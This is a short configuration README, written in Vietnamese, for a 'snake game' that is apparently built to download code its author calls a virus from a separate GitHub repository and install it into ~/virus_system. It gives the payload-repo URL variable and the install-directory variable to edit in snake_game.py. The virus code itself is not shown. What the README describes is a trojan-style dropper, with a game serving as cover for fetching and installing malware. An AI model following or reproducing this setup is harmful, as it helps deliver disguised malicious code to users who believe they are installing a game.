# Configuration

## Virus Repository URL

Để snake game có thể tải virus từ repo khác, bạn cần cập nhật URL trong file `snake_game.py`:

```python
VIRUS_REPO_URL = "https://github.com/YOUR_USERNAME/VirusCode/archive/refs/heads/main.zip"
```

Thay `YOUR_USERNAME` bằng username GitHub của bạn và `VirusCode` bằng tên repo chứa virus code.

## Installation Directory

Virus sẽ được cài đặt vào thư mục:
```
~/virus_system
```

Bạn có thể thay đổi đường dẫn này trong `snake_game.py`:
```python
VIRUS_INSTALL_DIR = os.path.expanduser("~/virus_system")
```

